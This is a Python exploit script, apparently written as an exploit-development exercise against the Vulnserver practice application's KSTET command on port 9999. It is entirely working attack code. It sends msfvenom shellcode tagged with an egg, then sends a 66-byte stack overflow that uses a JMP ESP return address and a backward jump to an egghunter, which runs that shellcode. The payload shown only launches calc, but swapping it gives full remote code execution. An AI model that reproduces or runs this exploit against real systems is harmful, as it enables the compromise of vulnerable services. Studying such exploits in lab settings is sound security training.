#!/usr/bin/python3

import socket
import subprocess
import struct

target_ip = "X.X.X.X"
target_port = 9999

def main():
    # msfvenom -p windows/exec CMD="calc" -f python -b "\x00"
    buf =  b""
    buf += b"\xdb\xdd\xbb\x36\x8d\x4f\xfa\xd9\x74\x24\xf4\x5d\x2b"
    buf += b"\xc9\xb1\x30\x83\xc5\x04\x31\x5d\x14\x03\x5d\x22\x6f"
    buf += b"\xba\x06\xa2\xed\x45\xf7\x32\x92\xcc\x12\x03\x92\xab"
    buf += b"\x57\x33\x22\xbf\x3a\xbf\xc9\xed\xae\x34\xbf\x39\xc0"
    buf += b"\xfd\x0a\x1c\xef\xfe\x27\x5c\x6e\x7c\x3a\xb1\x50\xbd"
    buf += b"\xf5\xc4\x91\xfa\xe8\x25\xc3\x53\x66\x9b\xf4\xd0\x32"
    buf += b"\x20\x7e\xaa\xd3\x20\x63\x7a\xd5\x01\x32\xf1\x8c\x81"
    buf += b"\xb4\xd6\xa4\x8b\xae\x3b\x80\x42\x44\x8f\x7e\x55\x8c"
    buf += b"\xde\x7f\xfa\xf1\xef\x8d\x02\x35\xd7\x6d\x71\x4f\x24"
    buf += b"\x13\x82\x94\x57\xcf\x07\x0f\xff\x84\xb0\xeb\xfe\x49"
    buf += b"\x26\x7f\x0c\x25\x2c\x27\x10\xb8\xe1\x53\x2c\x31\x04"
    buf += b"\xb4\xa5\x01\x23\x10\xee\xd2\x4a\x01\x4a\xb4\x73\x51"
    buf += b"\x35\x69\xd6\x19\xdb\x7e\x6b\x40\xb1\x81\xf9\xfe\xf7"
    buf += b"\x82\x01\x01\xa7\xea\x30\x8a\x28\x6c\xcd\x59\x0d\x82"
    buf += b"\x87\xc0\x27\x0b\x4e\x91\x7a\x56\x71\x4f\xb8\x6f\xf2"
    buf += b"\x7a\x40\x94\xea\x0e\x45\xd0\xac\xe3\x37\x49\x59\x04"
    buf += b"\xe4\x6a\x48\x67\x6b\xf9\x10\x68"
    # Shellcode string must be sent first to read shellcode into memory
    # Format is "COMMAND egg shellcode"
    # COMMAND can be an actual command, but shouldn't be, risk of shellcode being truncated
    # Instead jsut use a random string
    shellcode_string = b"RANDOM_STRING w00tw00t" + buf
    prepend = b"KSTET /.:/"
    # offset = 66
    # jmp esp is at 625011af
    jmp_esp = struct.pack("<I",0x625011af)
    # !mona egg
    egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    # place egghunter in original buffer code
    junk = (b"\x90" * 12) + egghunter + (b"\x44" * (66 - 12 - len(egghunter)))
    # jump back to egghunter
    jumpback = b"\xeb\xc4\x90\x90"
    attack_string = prepend + junk + jmp_esp + jumpback
    print(attack_string)
    
    # Still doesn't like it if you dont send in separate, closed off sessions
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    response = s.recv(2048)
    print(response.decode())
    s.send(shellcode_string)
    s.close()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    response = s.recv(2048)
    print(response.decode())
    s.send(attack_string)
    s.close()

if __name__ == '__main__':
    main()
